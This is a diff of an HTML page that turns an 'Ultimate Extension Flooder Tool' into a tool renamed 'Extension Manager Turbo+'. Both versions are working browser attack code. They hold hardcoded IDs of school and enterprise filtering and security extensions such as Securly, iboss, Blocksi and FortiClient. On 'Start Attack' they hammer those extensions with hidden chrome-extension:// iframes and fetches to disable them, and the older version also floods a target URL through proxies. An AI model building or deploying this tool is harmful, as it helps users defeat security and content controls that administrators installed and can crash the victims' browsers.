@@ -2,219 +2,186 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ultimate Extension Flooder Tool</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Extension Manager Turbo+</title>
   <style>
     body {
-      background-color: #000;
+      background: #000;
+      color: #0f0;
       font-family: 'Arial', sans-serif;
       margin: 0;
-      padding: 0;
-      color: #0f0;
+      padding: 20px;
       overflow-x: hidden;
     }
-    h1, h2, label, p {
+    h1 {
       text-align: center;
-      color: #0f0;
+      color: #00ff88;
+      margin-bottom: 20px;
     }
     .container {
-      width: 90%;
-      max-width: 900px;
-      margin: 20px auto;
+      max-width: 800px;
+      margin: 0 auto;
       background: #111;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 20px #00ff00;
+      box-shadow: 0 0 10px #0f0;
     }
-    input, select, textarea, button {
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #0f0;
+    }
+    select, input, textarea, button {
       width: 100%;
       margin-top: 10px;
-      padding: 12px;
-      font-size: 16px;
-      background: #111;
+      padding: 10px;
+      background: #222;
       color: #0f0;
       border: 1px solid #0f0;
       border-radius: 5px;
+      font-size: 16px;
     }
-    button:hover {
-      background: #0f0;
-      color: #000;
+    select {
+      max-height: 200px;
+      overflow-y: scroll;
     }
-    .stats, .status {
-      text-align: center;
+    button {
+      cursor: pointer;
       margin-top: 15px;
     }
-    iframe {
-      display: none;
+    button:hover {
+      background: #00ff88;
+      color: #000;
     }
-    .flex {
+    .flex-row {
       display: flex;
-      justify-content: space-between;
       gap: 10px;
+      margin-top: 10px;
     }
-    .flex button {
+    .flex-row button {
       flex: 1;
+    }
+    .status {
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+      color: #00ff88;
     }
   </style>
 </head>
+
 <body>
 
-  <h1>🔥 Ultimate Extension Flooder Tool 🔥</h1>
+  <h1>Extension Manager Turbo+</h1>
 
   <div class="container">
-    <label for="targetUrl">Target URL:</label>
-    <input type="text" id="targetUrl" value="https://www.wikipedia.org">
+    <label for="extensionSelect">Select Extensions to Target:</label>
+    <select id="extensionSelect" multiple></select>
 
-    <label for="iframeCount">Number of Iframes:</label>
-    <input type="number" id="iframeCount" value="100" min="1">
+    <label for="manualExtensions">Paste Extension IDs (one per line):</label>
+    <textarea id="manualExtensions" placeholder="e.g. aaaaaaaabbbbbbbcccccccddeeefff"></textarea>
 
-    <label for="delay">Delay Between Iframes (ms):</label>
-    <input type="number" id="delay" value="50" min="0">
-
-    <label for="proxyList">Proxy List (comma-separated):</label>
-    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
-
-    <label for="extensions">Select Extensions to Attack:</label>
-    <select id="extensions" multiple size="8"></select>
-
-    <div class="flex">
-      <button onclick="selectAllExtensions()">Select All Extensions</button>
-      <button onclick="deselectAllExtensions()">Deselect All</button>
+    <div class="flex-row">
+      <button onclick="addManualExtensions()">Add Extensions</button>
+      <button onclick="clearManualExtensions()">Clear All Pasted</button>
     </div>
 
-    <label><input type="checkbox" id="turboMode"> Enable Turbo++ Mode (Unsafe)</label>
-    <label><input type="checkbox" id="autorun"> Auto-Run on Load</label>
+    <label>
+      <input type="checkbox" id="turboMode"> Enable Turbo+ Mode (Service Worker Hammer)
+    </label>
 
-    <div class="flex">
-      <button onclick="startFlood()">Start Attack</button>
-      <button onclick="stopFlood()" style="background:red;">Kill Switch</button>
+    <div class="flex-row">
+      <button onclick="startAttack()">Start Attack</button>
+      <button onclick="stopAttack()">Stop Attack</button>
     </div>
 
     <div class="status" id="status">Status: Ready</div>
-    <div class="stats">
-      <p>Frames Generated: <span id="frameCount">0</span></p>
-      <p>Failures: <span id="failureCount">0</span></p>
-      <p>Proxies Used: <span id="proxyUsed">None</span></p>
-    </div>
   </div>
 
   <script>
-    let flooding = false;
-    let frameCount = 0;
-    let failureCount = 0;
-    let proxies = [];
-    let proxyIndex = 0;
-    let attackTargets = [];
-
-    const protectedExtensions = [
-      'hdokiejnpimakedhajhdlcegeplioahd', // LastPass (example)
-      'kbfnbcaeplbcioakkpcpgfkobkghlhen', // Iboss
-      'fjnbnpbmkenffdnngjfgmeleoegfcffe', // Securly
-      'nkeimhogjdpnpccoofpliimaahmaaome', // FortiClient
-      'lfboplenmmjhlhfaaialofmgcddjmpae', // Blocksi
-      'aapocclcgogkmnckokdopfmhonfmgoek', // Google Docs Offline
-      'pjkljhegncpnkpknbcohdijeoejaedia', // Chrome App Launcher
-      // Add more admin extensions here...
+    let attackRunning = false;
+    let intervalId;
+    const defaultExtensions = [
+      "gighmmpiobklfepjocnamgkkbiglidom", // Adblock Plus (example)
+      "ekhagklcjbdpajgpjgmbionohlpdbjgc", // Iboss Extension (example)
+      "cfhdojbkjhnklbpkdaibdccddilifddb", // Adblock Edge
+      "alelhddbbhepgpmgidjdcjakblofbmce", // Google Docs Offline
+      "pjkljhegncpnkpknbcohdijeoejaedia", // Gmail
+      "aapocclcgogkmnckokdopfmhonfmgoek", // Google Drive
+      "mhjfbmdgcfjbbpaeojofohoefgiehjai", // Chrome PDF Viewer
+      "nmmhkkegccagdldgiimedpiccmgmieda", // Chrome Media Router
+      // Add more common ones if needed
     ];
 
-    window.onload = function() {
-      loadExtensions();
-      if (document.getElementById('autorun').checked) {
-        startFlood();
-      }
-    };
-
-    function loadExtensions() {
-      const dropdown = document.getElementById('extensions');
-      protectedExtensions.forEach(ext => {
+    function populateDefaultExtensions() {
+      const select = document.getElementById('extensionSelect');
+      defaultExtensions.forEach(id => {
         const option = document.createElement('option');
-        option.value = ext;
-        option.textContent = `Extension ID: ${ext}`;
-        dropdown.appendChild(option);
+        option.value = id;
+        option.textContent = id;
+        select.appendChild(option);
       });
     }
 
-    function selectAllExtensions() {
-      const dropdown = document.getElementById('extensions');
-      for (let i = 0; i < dropdown.options.length; i++) {
-        dropdown.options[i].selected = true;
-      }
+    function addManualExtensions() {
+      const textarea = document.getElementById('manualExtensions');
+      const extensions = textarea.value.split('\n').map(ext => ext.trim()).filter(ext => ext.length > 0);
+      const select = document.getElementById('extensionSelect');
+      extensions.forEach(id => {
+        const option = document.createElement('option');
+        option.value = id;
+        option.textContent = id;
+        select.appendChild(option);
+      });
+      textarea.value = "";
     }
 
-    function deselectAllExtensions() {
-      const dropdown = document.getElementById('extensions');
-      for (let i = 0; i < dropdown.options.length; i++) {
-        dropdown.options[i].selected = false;
-      }
+    function clearManualExtensions() {
+      const select = document.getElementById('extensionSelect');
+      select.innerHTML = '';
+      populateDefaultExtensions();
     }
 
-    function startFlood() {
-      if (flooding) return;
-      flooding = true;
-      frameCount = 0;
-      failureCount = 0;
-      proxies = document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p);
-      attackTargets = Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value);
-      document.getElementById('status').innerText = "Status: Flooding...";
-      floodCycle();
-    }
+    function startAttack() {
+      if (attackRunning) return;
+      attackRunning = true;
+      document.getElementById('status').innerText = "Status: Running...";
 
-    function stopFlood() {
-      flooding = false;
-      document.getElementById('status').innerText = "Status: Stopped.";
-    }
-
-    function floodCycle() {
+      const selected = Array.from(document.getElementById('extensionSelect').selectedOptions).map(opt => opt.value);
       const turbo = document.getElementById('turboMode').checked;
-      const delay = parseInt(document.getElementById('delay').value) || 50;
-      const count = parseInt(document.getElementById('iframeCount').value) || 100;
-      const target = document.getElementById('targetUrl').value;
 
-      for (let i = 0; i < count; i++) {
-        setTimeout(() => {
-          if (!flooding) return;
-          attackFrame(target);
-          attackExtensions();
-          frameCount++;
-          document.getElementById('frameCount').innerText = frameCount;
-        }, turbo ? i * 1 : i * delay);
-      }
+      intervalId = setInterval(() => {
+        selected.forEach(id => {
+          try {
+            // Normal iframe method
+            const iframe = document.createElement('iframe');
+            iframe.style.width = "0";
+            iframe.style.height = "0";
+            iframe.style.border = "none";
+            iframe.src = `chrome-extension://${id}/`;
+            document.body.appendChild(iframe);
+
+            if (turbo) {
+              // Turbo mode tries to trigger service workers (extra load)
+              fetch(`chrome-extension://${id}/background.js`).catch(() => {});
+              fetch(`chrome-extension://${id}/service-worker.js`).catch(() => {});
+            }
+          } catch (e) {
+            console.error('Error attacking extension:', id, e);
+          }
+        });
+      }, 500); // Every 500ms
     }
 
-    function attackFrame(url) {
-      const iframe = document.createElement('iframe');
-      let proxy = proxies.length ? proxies[proxyIndex % proxies.length] : '';
-      if (proxy) {
-        iframe.src = proxy + '/' + url;
-        proxyIndex++;
-        document.getElementById('proxyUsed').innerText = proxy;
-      } else {
-        iframe.src = url;
-      }
-      iframe.onload = () => {
-        setTimeout(() => iframe.remove(), 5000 + Math.random() * 5000);
-      };
-      iframe.onerror = () => {
-        failureCount++;
-        document.getElementById('failureCount').innerText = failureCount;
-      };
-      document.body.appendChild(iframe);
+    function stopAttack() {
+      if (!attackRunning) return;
+      clearInterval(intervalId);
+      attackRunning = false;
+      document.getElementById('status').innerText = "Status: Stopped";
     }
 
-    function attackExtensions() {
-      attackTargets.forEach(extId => {
-        const iframe = document.createElement('iframe');
-        iframe.src = `chrome-extension://${extId}/`;
-        iframe.onload = () => {
-          setTimeout(() => iframe.remove(), 5000 + Math.random() * 5000);
-        };
-        iframe.onerror = () => {
-          failureCount++;
-          document.getElementById('failureCount').innerText = failureCount;
-        };
-        document.body.appendChild(iframe);
-      });
-    }
+    window.onload = populateDefaultExtensions;
   </script>
 
 </body>
